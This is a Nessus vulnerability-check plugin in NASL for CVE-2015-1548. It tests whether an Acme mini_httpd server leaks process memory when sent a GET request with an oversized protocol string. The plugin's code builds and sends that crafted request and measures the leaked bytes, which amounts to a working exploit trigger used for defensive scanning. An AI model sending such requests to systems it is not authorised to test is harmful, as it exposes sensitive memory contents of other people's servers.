#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90925);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/05/09 15:44:47 $");

  script_cve_id("CVE-2015-1548");
  script_bugtraq_id(73450);
  script_osvdb_id(118378);
  
  script_name(english:"Acme mini_httpd Protocol String Handling Memory Disclosure");
  script_summary(english:"Attempts to send a large header string to trigger a memory leak on the remote host.");
  
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Acme mini_httpd web server running on the remote host is affected
by a flaw in the add_headers() function within file mini_httpd.c that
is triggered when handling HTTP requests that have a very long
protocol string. An unauthenticated, remote attacker can exploit this,
via a crafted request, to cause an out-of-bounds read error, resulting
in the disclose of sensitive information in process memory.");
  # https://www.itinsight.hu/blog/posts/2015-01-23-mini_httpd-v1-21-information-disclosure.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?013a3d27");
  script_set_attribute(attribute:"see_also", value:"http://acme.com/software/mini_httpd/");
  script_set_attribute(attribute:"solution", value:
"If possible, upgrade to Acme mini_httpd version 1.23 or later. For
vendor hardware, such as modems or industrial control devices, ensure
that the firmware is current and/or its net access is limited to
trusted networks only.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/12/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/05/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:acme:mini_httpd");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

app = "mini_httpd";
port = get_http_port(default:80, embedded: TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

# Check http header
banner = get_http_banner(port:port);
if (banner == NULL) audit(AUDIT_WEB_BANNER_NOT, port);
if ("Server: mini_httpd" >!< banner) audit(AUDIT_WRONG_WEB_SERVER, port, app);

# Iterate over known html files
urls = get_kb_list("www/" + port + "/content/extensions/html");
if (urls == NULL) urls = make_list("/");
else urls = make_list(urls, "/");

report = "";
foreach url (urls)
{
  # Send basic request
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (res == NULL) continue;
  htmllen = strlen(res[2]);
  
  # Send memory leak request
  httpver = "";
  for (i = 0; i < 65535; i+=6) httpver += "NESSUS";
  httpver += "\Y";
  req = "GET " + url + " " + httpver + '\r\n';
  req += '\r\n';

  # Try to open socket
  trynum = 0;
  while (trynum < 10 && soc2 == 0)
  {
    trynum++;
    soc2 = open_sock_tcp(port);
  }

  if(!soc2) continue;
  
  send(socket: soc2, data: req);
  r = recv(socket: soc2, length: htmllen + strlen(httpver));
  close(soc2);
  soc2 = NULL;
  if (isnull(r)) continue;
  
  if (strlen(r) >= htmllen + strlen(httpver))
  {
    report += "  " + url + " (leaked " + (strlen(r) - htmllen) + " bytes)" + '\n';
  }
}

# Iterate over known directories
dirs = get_kb_list("www/" + port + "/content/directories");

foreach dir (dirs)
{
  # Remove trailing slash
  if (strlen(dir) > 0 && dir[strlen(dir)-1] == "/") dir = substr(dir, 0, strlen(dir)-2);
  
  # Skip duplicate root dir request
  if (dir == "") continue;
  
  # Send basic request
  res = http_send_recv3(method:"GET", item:dir+"/", port:port);
  if (res == NULL) continue;
  htmllen = strlen(res[2]);
  
  # Send memory leak request
  httpver = "";
  for (i = 0; i < 65535; i+=6) httpver += "NESSUS";
  httpver += "\Y";
  req = "GET " + dir + "/ " + httpver + '\r\n';
  req += '\r\n';

  # Try to open socket
  trynum = 0;
  while (trynum < 10 && soc2 == 0)
  {
    trynum++;
    soc2 = open_sock_tcp(port);
  }

  if(!soc2) continue;
  
  send(socket: soc2, data: req);
  r = recv(socket: soc2, length: htmllen + strlen(httpver));
  close(soc2);
  soc2 = NULL;
  if (isnull(r)) continue;
  
  if (strlen(r) >= htmllen + strlen(httpver))
  {
    report += "  " + dir + "/ (leaked " + (strlen(r) - htmllen) + " bytes)" + '\n';
  }
}
if (report != "")
{
  report = "Nessus attempted to exploit a memory leak vulnerability"+'\n'+
           "in the remote mini_httpd server. The server returned"+'\n'+
           "leaked memory on the following urls:" + '\n\n' + report;
  security_report_v4(
     port       : port,
     severity   : SECURITY_WARNING,
     extra      : report
    );
  exit(0);
}
else
  audit(AUDIT_INST_PATH_NOT_VULN, app);